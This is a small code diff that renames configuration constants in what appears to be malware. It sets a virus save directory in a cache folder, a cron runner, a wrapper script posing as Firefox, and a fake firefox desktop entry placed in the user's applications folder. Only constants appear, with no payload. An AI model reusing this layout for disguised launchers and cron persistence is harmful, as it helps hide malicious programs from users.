@@ -49,15 +49,15 @@ SAVE_VIRUS_DIR = "~/.cache/tmp"
 
 CRON_DIR = "~/.config/cron"
 
-BASH_SCRIPT_NAME = "cron-runner"
+CRON_SCRIPT_NAME = "cron-runner"
 
 WRAPPER_SCRIPT_NAME = "firefox-with-companion"
 
 WRAPPER_DIR = "~/.local/bin"
 
-DESKTOP_NAME_OVERRIDE = "firefox.desktop"
+DESKTOP_ENTRY_NAME = "firefox_fake.desktop"
 
-DESKTOP_DIR_OVERRIDE = "/usr/share/applications"
+DESKTOP_ENTRY_DIR = "~/.local/share/applications"
 
 FIREFOX_BIN = "/usr/lib/firefox/firefox"
 
